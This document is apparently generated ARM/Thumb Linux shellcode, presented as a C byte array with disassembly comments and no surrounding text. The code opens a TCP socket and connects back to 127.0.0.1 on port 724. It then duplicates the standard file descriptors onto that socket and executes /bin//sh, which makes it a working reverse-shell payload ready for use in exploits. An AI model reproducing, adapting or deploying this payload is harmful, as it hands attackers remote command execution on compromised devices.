
checking arm
added 1 modes
// Target architecture : ARM arm
// Endian mode         : little

#define CONNECT_SIZE 92

char CONNECT[] = {
  /* 0000 */ "\x44\x30\x9f\xe5" /* ldr     r3, [pc, #0x44] */
  /* 0004 */ "\x44\x40\x9f\xe5" /* ldr     r4, [pc, #0x44] */
  /* 0008 */ "\x44\x50\x9f\xe5" /* ldr     r5, [pc, #0x44] */
  /* 000C */ "\x44\x60\x9f\xe5" /* ldr     r6, [pc, #0x44] */
  /* 0010 */ "\x01\x00\x8f\xe2" /* add     r0, pc, #1      */
  /* 0014 */ "\x10\xff\x2f\xe1" /* bx      r0              */
  /* 0018 */ "\x52\x40"         /* eors    r2, r2          */
  /* 001A */ "\x01\x21"         /* movs    r1, #1          */
  /* 001C */ "\x02\x20"         /* movs    r0, #2          */
  /* 001E */ "\x0f\x02"         /* lsls    r7, r1, #8      */
  /* 0020 */ "\x19\x37"         /* adds    r7, #0x19       */
  /* 0022 */ "\x01\xdf"         /* svc     #1              */
  /* 0024 */ "\x80\x46"         /* mov     r8, r0          */
  /* 0026 */ "\x18\xb4"         /* push    {r3, r4}        */
  /* 0028 */ "\x69\x46"         /* mov     r1, sp          */
  /* 002A */ "\x4a\x70"         /* strb    r2, [r1, #1]    */
  /* 002C */ "\x10\x22"         /* movs    r2, #0x10       */
  /* 002E */ "\x02\x37"         /* adds    r7, #2          */
  /* 0030 */ "\x01\xdf"         /* svc     #1              */
  /* 0032 */ "\x03\x21"         /* movs    r1, #3          */
  /* 0034 */ "\x3f\x27"         /* movs    r7, #0x3f       */
  /* 0036 */ "\x40\x46"         /* mov     r0, r8          */
  /* 0038 */ "\x01\x39"         /* subs    r1, #1          */
  /* 003A */ "\x01\xdf"         /* svc     #1              */
  /* 003C */ "\xfa\xd1"         /* bne     #0x34           */
  /* 003E */ "\x52\x40"         /* eors    r2, r2          */
  /* 0040 */ "\x17\x1c"         /* adds    r7, r2, #0      */
  /* 0042 */ "\xe0\xb4"         /* push    {r5, r6, r7}    */
  /* 0044 */ "\x68\x46"         /* mov     r0, sp          */
  /* 0046 */ "\x0b\x27"         /* movs    r7, #0xb        */
  /* 0048 */ "\x01\xdf"         /* svc     #1              */
  /* 004A */ "\xc0\x46"         /* mov     r8, r8          */
  /* 004C */ "\x02\xff\x02\xd4"
  /* 0050 */ "\x7f\x00\x00\x01"
  /* 0054 */ "\x2f\x62\x69\x6e"
  /* 0058 */ "\x2f\x2f\x73\x68"
};